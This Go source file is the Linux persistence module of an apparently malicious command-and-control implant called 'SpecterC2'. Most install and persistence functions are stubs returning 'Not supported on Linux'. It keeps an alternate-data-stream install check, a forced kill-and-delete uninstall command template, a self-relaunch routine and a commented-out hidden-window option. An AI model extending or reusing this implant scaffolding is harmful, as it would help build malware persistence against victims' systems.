package persistence

import (
	"errors"
	"log"
	"os"
	"os/exec"
	"path"
	"time"
)

type installInfo struct {
	Loaded    bool
	Base      string
	Date      time.Time
	PType     int
	Exclusion bool
}

// Info contains persistent configuration details
var Info installInfo

const (
	cmdUninstall = "kill %d -F;rm '%s' -R -Fo"
)

// IsInstalled checks whether or not a valid Base is already present on the system.
func IsInstalled() bool {
	_, err := os.Stat(os.Args[0] + ":" + Ads)
	return !os.IsNotExist(err)
}

var (
	Ads         = "string"
	DisplayName = "Specter"
	Description = "SpecterC2 | 7heDeadBunnyCollectiv3"
)

// WriteInstallInfo dumps the current configuration to an Alternate Data Stream in binary format.
func WriteInstallInfo() error {
	var err error
	err = errors.New("Not supported on Linux")
	return err
}

// ReadInstallInfo attempts to read the stored configuration and initialize Info.
func ReadInstallInfo() error {
	var err error
	err = errors.New("Not supported on Linux")
	return err
}

func Perc(ptype int, _dir int) error {

	var err error
	err = errors.New("Not supported on Linux")
	return err
}

func persist(ptype int) error {
	var err error
	err = errors.New("Not supported on Linux")
	return err
}
func calm() {
	if r := recover(); r != nil {
		log.Println("Recovered from", r)
	}
}

// Install attempts to deploy the binary to the system and establish persistence.
// It also assembles the install configuration and saves it.
func Install() error {
	defer calm()
	var err error
	err = errors.New("Not supported on Linux")
	return err
}

// Uninstall attempts to undo all of the changes done to the system by Install.
func Uninstall() (str []string, err error) {
	err = errors.New("Not supported on Linux")
	return str, err
}

func Restart(arg string) {
	bin := path.Join(Info.Base, os.Args[0])
	//dSta := true
	// if util.Dbg {
	// 	log.Println("File: " + bin + "\nArg: " + arg)
	// 	dSta = false
	// }
	cmd := exec.Command(bin, arg)
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: dSta}
	cmd.Start()
	os.Exit(0)
}
